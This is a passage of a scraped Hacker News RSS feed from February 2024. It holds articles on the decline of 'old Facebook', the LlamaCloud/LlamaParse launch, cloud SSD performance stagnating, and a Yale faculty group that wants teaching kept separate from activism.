<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg" width="592" height="482.9968253968254" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:514,&quot;width&quot;:630,&quot;resizeWidth&quot;:592,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9e9a81ff-5784-478e-8b85-5951c5e9e334_630x514.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>12 Challenges readers </span><a href="https://www.linkedin.com/in/thandeka-xaba-a02ab323" rel="">Thandeka Xaba</a><span> and </span><a href="https://www.linkedin.com/in/tobymather/" rel="">Toby Mather</a><span> raised some great points in the </span><a href="https://12challenges.substack.com/p/a-typology-of-the-social-media-feed/comments" rel="">comments for yesterday’s Typology piece</a><span> (thanks so much!).</span></p><p>I want to pick up on something Toby said in particular, because I’m also puzzled by it:</p><ul><li><p><span>If Facebook, along with all social networks, is </span><a href="https://12challenges.substack.com/p/a-typology-of-the-social-media-feed/comments" rel="">moving away from the ‘social’ in social network</a><span> — why is no one making a new version of old Facebook?</span></p></li><li><p>To put it another way:</p><ul><li><p>Either: billions of people who used to find old Facebook useful have changed their preferences in the last few years, and no longer need something like that</p></li><li><p><span>Or: a huge unmet demand currently exists for a social network which is </span><a href="https://12challenges.substack.com/p/a-typology-of-the-social-media-feed" rel="">based on the social graph, instead of the content graph</a><span>, and which is pre-</span><a href="https://en.wikipedia.org/wiki/Enshittification" rel="">enshittification</a><span>*</span></p></li></ul></li></ul><p>Yes, the social graph has moved elsewhere, mostly to messaging platforms. But as Toby points out, these lack many of the features that we used to take for granted on Facebook — for instance, creating events, inviting friends, setting up groups (non-messaging ones, which were more like forums), and the serendipity/utility of a high-quality feed which included people you cared about.</p><p>To paraphrase Toby a little more: there should be money in making old Facebook even just for cross-promotion. For instance, you could imagine providing the good parts of old Facebook as a draw into an everything app like WeChat. Then, you have plenty of routes to monetization — you can do the ad thing, or make money through transaction fees on other products and services accessed in the same convenient one-stop shop.</p><p>Here are some thoughts I had about why the new version of old Facebook doesn’t exist:</p><ul><li><p><strong>Preferences changed? </strong><span>Maybe billions of people (or at least hundreds of millions) </span><em>have </em><span>changed their preferences. Possible that the world has collectively wised up to </span><a href="https://en.wikipedia.org/wiki/Enshittification" rel="">enshittification</a><span> and no longer trusts social networks to be a good place for your social graph, but is fine with social networks using the (lower stakes) content graph.</span></p><ul><li><p>That would explain why messaging, which is mostly based on phone contacts and therefore more in the user’s control, would be the place people now trust for their social graph. I’m not sure anyone thinks about this though, to be honest.</p></li></ul></li><li><p><strong>No more attention left? </strong><span>Maybe the rise of the content graph, and its exceptional ability to grab attention (think about how addictive TikTok is), crowds out any new social network competitor. You can’t launch old Facebook because it won’t be as exciting, as compelling, as shareable as TikTok — so it won’t grow fast enough and will fail to become relevant. </span><a href="https://12challenges.substack.com/p/a-typology-of-the-social-media-feed" rel="">The reds in my draft typology</a><span> are where it’s at. You won’t be able to claim even 5 minutes a day away from people’s TikTok usage.</span></p></li><li><p><strong>Antitrust has been weak? </strong><span>Up until recent moves by antitrust bodies in the US and EU, Facebook could simply buy out any threat to them, including any new version of old Facebook.</span></p></li><li><p><strong>Social graph burnout? </strong><span>Maybe there’s a limit to how many times people want to (re)make their social graph — people who invested in making their Facebook social graph can’t be bothered to do it again. I don’t think so though. Plenty of other apps create social graphs, e.g. Strava, and usually it’s by stealth, in a way that doesn’t feel like effort. Also, in this version of the world we’d expect that the younger generation, who never did the whole Facebook thing, would still be open to a new version of old Facebook. </span></p></li></ul><p><span>Please drop suggestions in the comments. This is a question I’m very interested in, and I’m going to dig deeper in future articles as I explore the </span><a href="https://12challenges.substack.com/p/a-typology-of-the-social-media-feed" rel="">typology of social media</a><span>.</span></p><p><span>*Or ‘e14n’ as Toby put it — a </span><a href="https://a16z.com/" rel="">tongue-in-cheek contraction</a><span> which </span><a href="https://mastodon.social/@louisbarclay/111964531880850866" rel="">got a nice boost on Mastodon from Cory Doctorow</a><span>, creator of the original term.</span></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LlamaCloud and LlamaParse (183 pts)]]></title>
            <link>https://blog.llamaindex.ai/introducing-llamacloud-and-llamaparse-af8cedf9006b</link>
            <guid>39443972</guid>
            <pubDate>Tue, 20 Feb 2024 17:20:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.llamaindex.ai/introducing-llamacloud-and-llamaparse-af8cedf9006b">https://blog.llamaindex.ai/introducing-llamacloud-and-llamaparse-af8cedf9006b</a>, See on <a href="https://news.ycombinator.com/item?id=39443972">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><a href="https://medium.com/@jerryjliu98?source=post_page-----af8cedf9006b--------------------------------" rel="noopener follow"><div aria-hidden="false"><p><img alt="Jerry Liu" src="https://miro.medium.com/v2/resize:fill:88:88/1*_TphgG5Y0SkBKOANEWhVYw.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a><a href="https://blog.llamaindex.ai/?source=post_page-----af8cedf9006b--------------------------------" rel="noopener  ugc nofollow"><div aria-hidden="false"><p><img alt="LlamaIndex Blog" src="https://miro.medium.com/v2/resize:fill:48:48/1*_mrG8FG_LiD23x0-mEtUkw.jpeg" width="24" height="24" loading="lazy" data-testid="publicationPhoto"></p></div></a></div><p id="e710">Today is a big day for the LlamaIndex ecosystem: we are announcing LlamaCloud, a new generation of managed parsing, ingestion, and retrieval services, designed to bring <strong>production-grade</strong> <strong>context-augmentation</strong> to your LLM and RAG applications.</p><p id="c8e2">Using LlamaCloud as an enterprise AI engineer, you can focus on writing the business logic and not on data wrangling. Process large volumes of production data, immediately leading to better response quality. LlamaCloud launches with the following key components:</p><ol><li id="fac2"><strong>LlamaParse:</strong> Proprietary parsing for complex documents with embedded objects such as tables and figures. LlamaParse directly integrates with LlamaIndex ingestion and retrieval to let you build retrieval over complex, semi-structured documents. You’ll be able to answer complex questions that simply weren’t possible previously.</li><li id="415d"><strong>Managed Ingestion and Retrieval API:</strong> An API which allows you to easily load, process, and store data for your RAG app and consume it in any language. Backed by data sources in <a href="https://llamahub.ai/" rel="noopener ugc nofollow" target="_blank">LlamaHub</a>, including LlamaParse, and our data storage integrations.</li></ol><p id="5e55">LlamaParse is available in a public preview setting starting today. It can currently handle PDFs and usage is capped for public use; <a href="https://llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">contact us</a> for commercial terms. The managed ingestion and retrieval API is available as a private preview; we are offering access to a limited set of enterprise design partners. If you’re interested, <a href="https://llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">get in touch</a>. (We’ve also launched a <a href="https://www.llamaindex.ai/" rel="noopener ugc nofollow" target="_blank">new version of our website</a> 🦙!)</p><h2 id="894a">RAG is Only as Good as your Data</h2><p id="f442">A core promise of LLMs is the ability to automate knowledge search, synthesis, extraction, and planning over any source of unstructured data. Over the past year a new data stack has emerged to power these context-augmented LLM applications, popularly referred to as Retrieval-Augmented Generation (RAG). This stack includes loading data, processing it, embedding it, and loading into a vector database. This enables downstream orchestration of retrieval and prompting to provide context within an LLM app.</p><p id="c160">This stack is different from any ETL stack before it, because unlike traditional software, every decision in the data stack directly <strong>affects the accuracy</strong> of the full LLM-powered system. Every decision like chunk size and embedding model affects LLM outputs, and since LLMs are black boxes, you can’t unit test your way to correct behavior.</p><p id="4d67">We’ve spent the past year hard at work at the forefront of providing tooling and educating users on how to build high-performing, advanced RAG for various use cases. We crossed the 2M monthly download mark, and are used by large enterprises to startups, including Adyen, T-Systems, Jasper.ai, Weights and Biases, DataStax, and many more.</p><p id="0a33">But while getting started with our famous 5-line starter example is easy, building production-grade RAG remains a complex and subtle problem. In our hundreds of user conversations, we learned the biggest pain points:</p><ul><li id="fdb2"><strong>Results aren’t accurate enough:</strong> The application was not able to produce satisfactory results for a long-tail of input tasks/queries.</li><li id="97dd"><strong>The number of parameters to tune is overwhelming:</strong> It’s not clear which parameters across the data parsing, ingestion, retrieval.</li><li id="2625"><strong>PDFs are specifically a problem:</strong> I have complex docs with lots of messy formatting. How do I represent this in the right way so the LLM can understand it?</li><li id="6e64"><strong>Data syncing is a challenge:</strong> Production data often updates regularly, and continuously syncing new data brings a new set of challenges.</li></ul><p id="9b57">These are the problems we set out to solve with LlamaCloud.</p><h2 id="e0fd">Data Pipelines to Bring you to Production</h2><p id="53ac">We built LlamaCloud and LlamaParse as the data pipelines to get your RAG application to production more quickly.</p><h2 id="888d">LlamaParse</h2><p id="f959">LlamaParse is a state-of-the-art parser designed to specifically unlock RAG over complex PDFs with embedded tables and charts. This simply wasn’t possible before with other approaches, and we’re incredibly excited about this technology.</p><figure><figcaption>LlamaParse Demo. Given a PDF file, returns a parsed markdown file that maintains semantic structure within the document.</figcaption></figure><p id="7d47">For the past few months we’ve been obsessed with this problem. This is a surprisingly prevalent use case across a variety of data types and verticals, from ArXiv papers to 10K filings to medical reports.</p><p id="1e5c">Naive chunking and retrieval algorithms do terribly. We were the first to propose a <a href="https://docs.llamaindex.ai/en/stable/examples/query_engine/pdf_tables/recursive_retriever.html" rel="noopener ugc nofollow" target="_blank">novel recursive retrieval RAG technique</a> for being able to hierarchically index and query over tables and text in a document. The only challenge that remained was how to properly parse out tables and text in the first place.</p><figure><figcaption>Comparison of LlamaParse vs. PyPDF over the Apple 10K filing. <a href="https://drive.google.com/file/d/1fyQAg7nOtChQzhF2Ai7HEeKYYqdeWsdt/view?usp=sharing" rel="noopener ugc nofollow" target="_blank">Full comparisons are here</a>. A green highlight in a cell means that the RAG pipeline correctly returned the cell value as the answer to a question over that cell. A red highlight means that the question was answered incorrectly.</figcaption></figure><p id="8596">This is where LlamaParse comes in. We’ve developed a proprietary parsing service that is incredibly good at parsing PDFs with complex tables into a well-structured markdown format. This representation directly plugs into the advanced Markdown parsing and recursive retrieval algorithms available in the open-source library. The end result is that you are able to build RAG over complex documents that can answer questions over both tabular and unstructured data. Check out the results below for a comparison:</p><figure><figcaption>Comparison of baseline PDF approach (top) vs. LlamaParse + advanced retrieval (bottom)</figcaption></figure><figure><figcaption>Results over the <a href="https://github.com/run-llama/llama-hub/tree/main/llama_hub/llama_datasets/10k/uber_2021" rel="noopener ugc nofollow" target="_blank">Uber 10K Dataset</a>. For more information on our evaluation metrics check out our <a href="https://docs.llamaindex.ai/en/stable/module_guides/evaluating/root.html" rel="noopener ugc nofollow" target="_blank">evaluation page</a> here.</figcaption></figure><p id="e09d">This service is available in a <strong>public preview mode:</strong> available to everyone, but with a usage limit (1k pages per day). It operates as a standalone service that also plugs into our managed ingestion and retrieval API (see below). Check out our <a href="https://www.notion.so/LlamaParse-onboarding-4cd478dbff1f48efaab6f91501118b9e?pvs=21" rel="noopener ugc nofollow" target="_blank">LlamaParse onboarding here</a> for more details.</p><pre><span id="e50b">from llama_parse import LlamaParse<p>parser = LlamaParse(<br>    api_key="llx-...",  # can also be set in your env as LLAMA_CLOUD_API_KEY<br>    result_type="markdown",  # "markdown" and "text" are available<br>    verbose=True<br>)</p></span></pre><p id="d175">For unlimited commercial use of LlamaParse, <a href="https://llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">get in touch</a> with us.</p><p id="7976"><strong>Next Steps</strong></p><p id="99dc">Our early users have already given us important feedback on what they’d like to see next. Currently we primarily support PDFs with tables, but we are also building out better support for figures, and and an expanded set of the most popular document types: .docx, .pptx, .html.</p><h2 id="e289">Managed Ingestion and Retrieval</h2><p id="838c">Our other main offering in LlamaCloud is a managed ingestion and retrieval API which allows you to easily declare performant data pipelines for any context-augmented LLM application.</p><p id="fa97">Get clean data for your LLM application, so you can spend less time wrangling data and more time writing core application logic. LlamaCloud empowers enterprise developers with the following benefits:</p><ul><li id="b2ab"><strong>Engineering Time Savings:</strong> Instead of having to write custom connectors and parsing logic in Python, our APIs allow you to directly connect to different data sources.</li><li id="81f3"><strong>Performance:</strong> we provide good out-of-the-box performance for different data types, while offering an intuitive path for experimentation, evaluation, and improvement.</li><li id="cf72"><strong>Ease Systems Complexity:</strong> Handle a large number of data sources with incremental updates.</li></ul><p id="5352">Let’s do a brief tour through the core components!</p><ol><li id="bc64"><strong>Ingestion:</strong> Declare a managed pipeline to process and transform/chunk/embed data backed by our 150+ data sources in LlamaHub and our 40+ storage integrations as destinations. Automatically handle syncing and load balancing. Define through the UI or our open-source library.</li><li id="da88"><strong>Retrieval:</strong> Get access to state-of-the-art, advanced retrieval backed by our open-source library and your data storage. Wrap it in an easy-to-use REST API that you can consume from any language.</li><li id="4f7a"><strong>Playground:</strong> Interactive UI to test and refine your ingestion/retrieval strategies pre-deployment, with evaluations in the loop.</li></ol><figure><figcaption>LlamaCloud Playground: configure, evaluate, and optimize your ingestion/retrieval pipeline before deployment.</figcaption></figure><figure><figcaption>LlamaCloud Retrieval: Access advanced retrieval over your storage system via an API.</figcaption></figure><p id="39e8">We are opening up a private beta to a limited set of enterprise partners for the managed ingestion and retrieval API. If you’re interested in centralizing your data pipelines and spending more time working on your actual RAG use cases, come <a href="https://llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">talk to us</a>.</p><h2 id="b282">Launch Partners and Collaborators</h2><p id="edfa">We opened up access to LlamaParse at <a href="https://rag-a-thon.devpost.com/" rel="noopener ugc nofollow" target="_blank">our hackathon</a> we co-hosted with <a href="https://www.futureproofsv.com/" rel="noopener ugc nofollow" target="_blank">Futureproof Labs</a> and <a href="https://www.datastax.com/" rel="noopener ugc nofollow" target="_blank">Datastax</a> at the beginning of February. We saw some incredible applications of LlamaParse in action, <a rel="noopener ugc nofollow" target="_blank" href="https://blog.llamaindex.ai/pioneering-the-future-of-housing-introducing-genai-driven-adu-planning-ea950be71e2f">including parsing building codes for Accessory Dwelling Unit (ADU) planning</a>, <a href="https://devpost.com/software/home-ai" rel="noopener ugc nofollow" target="_blank">parsing real-estate disclosures for home buying</a>, and dozens more.</p><p id="e999">Eric Ciarla, co-founder at Mendable AI, incorporated LlamaParse into Mendable’s data stack: “We integrated LlamaParse into our <a href="https://github.com/mendableai/data-connectors" rel="noopener ugc nofollow" target="_blank">open source data connector repo</a> which powers our production ingestion suite. It was easy to integrate and more powerful than any of the alternatives we tried.”</p><p id="f99d">We’re also excited to be joined by initial launch partners and collaborators in the LLM and AI ecosystem, from storage to compute.</p><p id="4c43"><strong>DataStax</strong></p><p id="1965">Datastax has incorporated LlamaParse into their RAGStack to bring a privacy-preserving out-of-the-box RAG solution for enterprises: "Last week one of our customers Imprompt has launched a pioneering 'Chat-to-Everything' platform leveraging RAGStack powered by LlamaIndex to enhance their enterprise offerings while prioritizing privacy." said Davor Bonaci, CTO and executive vice president, DataStax. "We're thrilled to partner with LlamaIndex to bring a streamlined solution to market. By incorporating LlamaIndex into RAGStack, we are providing enterprise developers with a comprehensive Gen AI stack that simplifies the complexities of RAG implementation, while offering long-term support and compatibility assurance.”</p><p id="9514"><strong>MongoDB</strong></p><p id="a3a9">“MongoDB’s partnership with LlamaIndex allows for the ingestion of data into the MongoDB Atlas Vector database, and the retrieval of the index from Atlas via LlamaParse and LlamaCloud, enabling the development of RAG systems and other AI applications,” said Greg Maxson, Global Lead, AI Ecosystems at MongoDB. “Now, developers can abstract complexities associated with data ingestion, simplify RAG pipeline implementations, and more cost effectively develop large language model applications, ultimately accelerating generative AI app development and more quickly bringing apps to market.”</p><p id="8e0b"><strong>Qdrant</strong></p><p id="9363">André Zayarni, CEO of Qdrant, says “The Qdrant team is excited to partner with LlamaIndex to combine the power of optimal data preprocessing, vectorization, and ingestion with Qdrant for a powerful fullstack RAG solution.”</p><p id="b6bb"><strong>NVIDIA</strong></p><p id="0675">We are also excited to collaborate with NVIDIA to integrate LlamaIndex with the <a href="https://www.nvidia.com/en-us/data-center/products/ai-enterprise/" rel="noopener ugc nofollow" target="_blank">NVIDIA AI Enterprise</a> software platform for production AI: “LlamaCloud will help enterprises get generative AI applications from development into production with connectors that link proprietary data to the power of large language models,” said Justin Boitano, vice president, Enterprise and Edge Computing, NVIDIA. “Pairing LlamaCloud with NVIDIA AI Enterprise can accelerate the end-to-end LLM pipeline — including data processing, embedding creation, indexing, and model inference on accelerated computing across clouds, data centers and out to the edge.”</p><h2 id="fc7f">FAQ</h2><p id="313f"><strong>Is this competitive with vector databases?</strong></p><p id="323e">No. LlamaCloud is focused primarily on data parsing and ingestion, which is a complementary layer to any vector storage provider. The retrieval layer is orchestration on top of an existing storage system. LlamaIndex open-source integrates with 40+ of the most popular vector databases, and we are working hard to do the following:</p><ol><li id="b115">Integrate LlamaCloud with storage providers of existing design partners</li><li id="52cf">Make LlamaCloud available in a more “self-serve” manner.</li></ol><h2 id="2c92">Next Steps</h2><p id="83b6">As mentioned in the above sections, LlamaParse is available for public preview starting today with a usage cap. LlamaCloud is in a private preview mode; we are offering access to a limited set of enterprise design partners. If you’re interested come talk to us!</p><p id="6b23">LlamaParse: <a href="https://github.com/run-llama/llama_parse" rel="noopener ugc nofollow" target="_blank">Repo</a>, <a href="https://github.com/run-llama/llama_parse/blob/main/examples/demo_advanced.ipynb" rel="noopener ugc nofollow" target="_blank">Cookbook</a>, <a href="https://www.llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">Contact Us</a></p><p id="22db">LlamaCloud: <a href="https://www.llamaindex.ai/contact" rel="noopener ugc nofollow" target="_blank">Contact Us</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Let's Build the GPT Tokenizer (by Andrej Karpathy) [video] (556 pts)]]></title>
            <link>https://www.youtube.com/watch?v=zduSFxRajkE</link>
            <guid>39443965</guid>
            <pubDate>Tue, 20 Feb 2024 17:20:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=zduSFxRajkE">https://www.youtube.com/watch?v=zduSFxRajkE</a>, See on <a href="https://news.ycombinator.com/item?id=39443965">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[SSDs Have Become Fast, Except in the Cloud (465 pts)]]></title>
            <link>http://databasearchitects.blogspot.com/2024/02/ssds-have-become-ridiculously-fast.html</link>
            <guid>39443679</guid>
            <pubDate>Tue, 20 Feb 2024 16:59:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://databasearchitects.blogspot.com/2024/02/ssds-have-become-ridiculously-fast.html">http://databasearchitects.blogspot.com/2024/02/ssds-have-become-ridiculously-fast.html</a>, See on <a href="https://news.ycombinator.com/item?id=39443679">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-1474926564874918617" itemprop="description articleBody">
<p>In recent years, flash-based SSDs have largely replaced disks for most storage use cases. Internally, each SSD consists of many independent flash chips, each of which can be accessed in parallel. Assuming the SSD controller keeps up, the throughput of an SSD therefore primarily depends on the interface speed to the host. In the past six years, we have seen a rapid transition from SATA to PCIe 3.0 to PCIe 4.0 to PCIe 5.0. As a result, there was an explosion in SSD throughput:
<img src="https://db.in.tum.de/~leis/dbtrends/ssd-bandwidth.svg" width="90%">  </p>

<p>
At the same time, we saw not just better performance, but also more capacity per dollar:
</p>
<p><img src="https://db.in.tum.de/~leis/dbtrends/ssd-capacity.svg" width="90%"></p><p>
The two plots illustrate the power of a commodity market. The combination of open standards (NVMe and PCIe), huge demand, and competing vendors led to great benefits for customers. Today, top PCIe 5.0 data center SSDs such as the <a href="https://europe.kioxia.com/en-europe/business/ssd/enterprise-ssd.html">Kioxia CM7-R</a> or <a href="https://semiconductor.samsung.com/emea/ssd/enterprise-ssd/pm1743/">Samsung PM1743</a> achieve up to 13 GB/s read throughput and 2.7M+ random read IOPS. Modern servers have around 100 PCIe lanes, making it possible to have a dozen of SSDs (each usually using 4 lanes) in a single server at full bandwidth. For example, in our lab we have a single-socket Zen 4 server with 8 Kioxia CM7-R SSDs, which achieves 100GB/s (!) I/O bandwidth:</p>
<p><img src="https://db.in.tum.de/~leis/dbtrends/iostat.png" width="90%"></p><p>
AWS EC2 was an early NVMe pioneer, launching the <a href="https://aws.amazon.com/blogs/aws/now-available-i3-instances-for-demanding-io-intensive-applications/">i3 instance</a> with 8 physically-attached NVMe SSDs in early 2017. At that time, NVMe SSDs were still expensive, and having 8 in a single server was quite remarkable. The per-SSD read (2 GB/s) and write (1 GB/s) performance was considered state of the art as well. Another step forward occurred in 2019 with the launch of <a href="https://aws.amazon.com/blogs/aws/new-the-next-generation-i3en-of-i-o-optimized-ec2-instances/">i3en instances</a>, which doubled storage capacity per dollar.</p>

<p>
Since then, several NVMe instance types, including i4i and im4gn, have been launched. Surprisingly, however, the performance has not increased; seven years after the i3 launch, we are still stuck with 2 GB/s per SSD. Indeed, the venerable i3 and i3en instances remain the best EC2 has to offer in terms of IO/$ and SSD capacity/$, respectively. Personally, I find this very surprising given the SSD bandwidth explosion and cost reductions we have seen on the commodity market. At this point, the performance gap between state-of-the-art SSDs and those offered by major cloud vendors, especially in read throughput, write throughput, and IOPS, is nearing an order of magnitude. (Azure's top NVMe instances are only slightly faster than AWS's.)</p>

<p>
What makes this stagnation in the cloud even more surprising is that we have seen great advances in other areas. For example, during the same 2017 to 2023 time frame, EC2 network bandwidth exploded, increasing from 10 Gbit/s (c4) to 200 Gbit/s (c7gn). Now, I can only speculate why the cloud vendors have not caught up on the storage side:
</p><ul>
<li> One theory is that EC2 intentionally caps the write speed at 1 GB/s to avoid frequent device failure, given the total number of writes per SSD is limited. However, this does not explain why the read bandwidth is stuck at 2 GB/s.</li>
<li> A second possibility is that there is no demand for faster storage because very few storage systems can actually exploit tens of GB/s of I/O bandwidth. See our <a href="https://www.vldb.org/pvldb/vol16/p2090-haas.pdf">recent VLDB paper</a>. On the other hand, as long as fast storage devices are not widely available, there is also little incentive to optimize existing systems.</li>
<li> A third theory is that if EC2 were to launch fast and cheap NVMe instance storage, it would disrupt the cost structure of its other storage service (in particular EBS). This is, of course, the classic innovator's dilemma, but one would hope that one of the smaller cloud vendors would make this step to gain a competitive edge.</li>
</ul>


<p>
Overall, I'm not fully convinced by any of these three arguments. Actually, I hope that we'll soon see cloud instances with 10 GB/s SSDs, making this post obsolete.
</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Faculty group calls on Yale to make teaching 'distinct from activism' (143 pts)]]></title>
            <link>https://yaledailynews.com/blog/2024/02/19/faculty-group-calls-on-yale-to-make-teaching-distinct-from-activism/</link>
            <guid>39443548</guid>
            <pubDate>Tue, 20 Feb 2024 16:50:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yaledailynews.com/blog/2024/02/19/faculty-group-calls-on-yale-to-make-teaching-distinct-from-activism/">https://yaledailynews.com/blog/2024/02/19/faculty-group-calls-on-yale-to-make-teaching-distinct-from-activism/</a>, See on <a href="https://news.ycombinator.com/item?id=39443548">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            

            <p>
              The new initiative urges the University to adopt six new measures, which include more thorough protections on free speech, a commitment to institutional neutrality and new guidelines regarding donor influence.            </p>

            <p>

                                          Staff Reporters                    
                  </p>

                              <!-- If NO coauthors_posts_links -->
                          
          </div><section>
          <!-- iframe for article audio !-->
           
                                                        <img src="https://yaledailynews.com/wp-content/uploads/2024/02/facforyale_brbh_ElliePark.jpg">
                <p>Ellie Park, Photography Editor</p>
                                  
                                                    <p><span>Over 100 faculty members now have their signatures displayed on a </span><a href="https://facultyforyale.yale.edu/homepage"><span>website</span></a><span> for a new faculty group, Faculty for Yale, which “insist[s] on the primacy of teaching, learning and research as distinct from advocacy and activism.”</span></p>
<p><span>Among other measures, the group calls for “a thorough reassessment of administrative encroachment” and the promotion of diverse viewpoints. The group also calls for a more thorough description of free expression guidelines in the Faculty Handbook; Yale’s current guidelines are based on its 1974 </span><a href="https://secretary.yale.edu/sites/default/files/files/freedom1975.pdf"><span>Woodward Report</span></a><span>. The group also wants Yale to implement a set of </span><a href="https://president.yale.edu/sites/default/files/files/Report%20of%20the%20GPRC%20(FINAL).pdf"><span>guidelines</span></a><span> regarding donor influence, which were first put forth by the </span><a href="https://yaledailynews.com/blog/2022/09/26/salovey-promises-to-clarify-donorship-protocols/"><span>Gift Policy Review Committee</span></a><span> in 2022.</span></p>
<p><span>On its site, Faculty for Yale outlines issues that it claims stem from Yale’s “retreat from the university’s basic mission.”</span></p>
<p><span>“Faculty for Yale is a spontaneously coalescing group of (so far) over 100 faculty from throughout the university who wish to support our university in re-dedicating itself to its historic and magnificent mission to preserve, produce, and transmit knowledge,” professor of social and natural science Nicholas Christakis wrote to the News. “We believe that any loss of focus on this deep, fundamental, and important mission may contribute to a range of challenges being faced in universities like ours nowadays.”</span></p>
<p><span>Faculty for Yale also urges the University to adopt the University of Chicago’s </span><a href="https://provost.uchicago.edu/sites/default/files/documents/reports/KalvenRprt_0.pdf"><span>Kalven Committee report</span></a><span> that urges institutional neutrality.</span></p>
<p><span>However, in an interview with the News in November, Salovey said that although more college presidents might be considering the principle of institutional neutrality “because they realize how fraught it has become to speak out” on the issues of the day, he does not yet hold that view. He added, though, that “it’s a worthy view to consider.”</span></p>
<p><span>“I still think that we are going to want to speak out as leaders in higher education on issues of the day, but the decision about when to and when not to is not an easy one,” Salovey said. “I tend to use a criteria of how directly our campus is affected by whatever the incident in the world is but that’s still not a perfect criteria … there are atrocities all over the world, and I’ve probably not spoken out on more of them than I have spoken on.”</span></p>
<p><span>Christakis, speaking on behalf of the group, told the News that “we hope to meet” with Salovey.&nbsp;</span></p>
<p><span>Howard Forman, a professor at the School of Management, said that he signed the letter in part to emphasize Yale’s “promises for advancing and disseminating knowledge” amid the presidential search process. Forman also called himself a “big fan” of Salovey.</span></p>
<p><span>“He has served us extremely well, facing numerous internal and external upheavals and facing up to Yale’s own troubling history,” Forman said. “This letter does not sit in judgment of him or his predecessors. It speaks to our future and how we all can be better.”</span></p>
<p><span>Although the group was formed in December, a column published </span><a href="https://www.wsj.com/articles/for-country-and-for-yale-26be12fd"><span>last month</span></a><span> in the Wall Street Journal discussed emails from Christakis and law professor Kate Stith — sent to their faculty colleagues — in which they expressed views now available on Faculty for Yale’s site.&nbsp;</span></p>
<p><span>Other signatories include the Trumbull and Grace Hopper heads of college — biomedical engineering professor Fahmeed Hyder and sociology professor Julia Adams, respectively. Hyder did not respond to the News’ request for comment.</span></p>
<p><span>Adams wrote to the News that academic freedom, which she described as “the bedrock of the advancement of knowledge through teaching and learning,” needs support at Yale and other colleges and universities.</span></p>
<p><span>“The concerns articulated in the FfY formation statement pertain to universities — and not their members! — as activists,” Adams wrote. “I consider myself something of an activist on behalf of academic freedom, scholarship, and the mission of the university. But there will also come times, as the Kalven Report notes, in which colleges and universities confront threats to their very mission, and must seek to defend their fundamental values. That is happening worldwide.”</span></p>
